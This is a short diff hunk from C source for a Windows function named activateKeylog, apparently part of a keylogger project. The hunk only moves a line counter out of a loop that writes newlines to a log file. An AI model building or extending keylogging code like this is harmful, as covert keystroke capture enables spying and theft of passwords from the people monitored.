@@ -41,8 +41,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 	bool keyDown[62] = {false};
 
 	fputs("\n", fp); fflush(fp);
+
 	while (1) {
-		int count = 0;
 		if(count > 120) {fputs("\n", fp); fflush(fp); count = 0;}
 
 		// Baris 1: [MOUSE1]
